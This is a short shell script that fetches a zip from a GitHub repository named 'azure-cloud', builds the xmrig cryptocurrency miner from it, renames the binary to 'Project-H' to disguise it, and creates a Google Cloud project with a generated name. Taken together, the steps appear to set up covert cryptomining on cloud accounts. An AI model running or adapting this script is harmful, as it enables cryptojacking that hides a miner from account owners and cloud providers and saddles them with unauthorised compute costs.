sudo apt-get update

sudo apt-get --assume-yes install build-essential cmake libuv1-dev libssl-dev libhwloc-dev git unzip
sudo wget https://github.com/U117A/azure-cloud/raw/master/AAA.zip
sudo unzip AAA.zip
#sudo rm -rf "$HOME"/AAA #IF****
#sudo mv AAA "$HOME"
sudo rm -rf AAA.zip

cd AAA
mkdir build
cd build
cmake ..
make
sudo mv xmrig Project-H

project="p$(date +"%d%m%Y%H%M%S")
gcloud config set project $project
